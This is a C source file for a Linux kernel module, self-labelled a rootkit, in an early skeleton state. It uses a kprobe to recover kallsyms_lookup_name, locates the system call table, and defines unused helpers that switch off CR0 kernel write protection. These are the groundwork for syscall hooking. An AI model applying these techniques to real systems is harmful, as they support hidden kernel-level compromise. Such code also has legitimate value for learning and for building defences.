#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/utsname.h>

// Syscall table address pointer
unsigned long *sys_call_table_addr;


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif


#ifdef CONFIG_X86

#include <asm/paravirt.h>

extern unsigned long __force_order;

static inline void write_forced_cr0(unsigned long value) {
    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
}

#endif

static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif
    sys_call_table_addr = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    struct new_utsname *uts;
    uts = utsname();

    printk(KERN_INFO "System architecture: %s\n", uts->machine);

    return 0;
}


static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
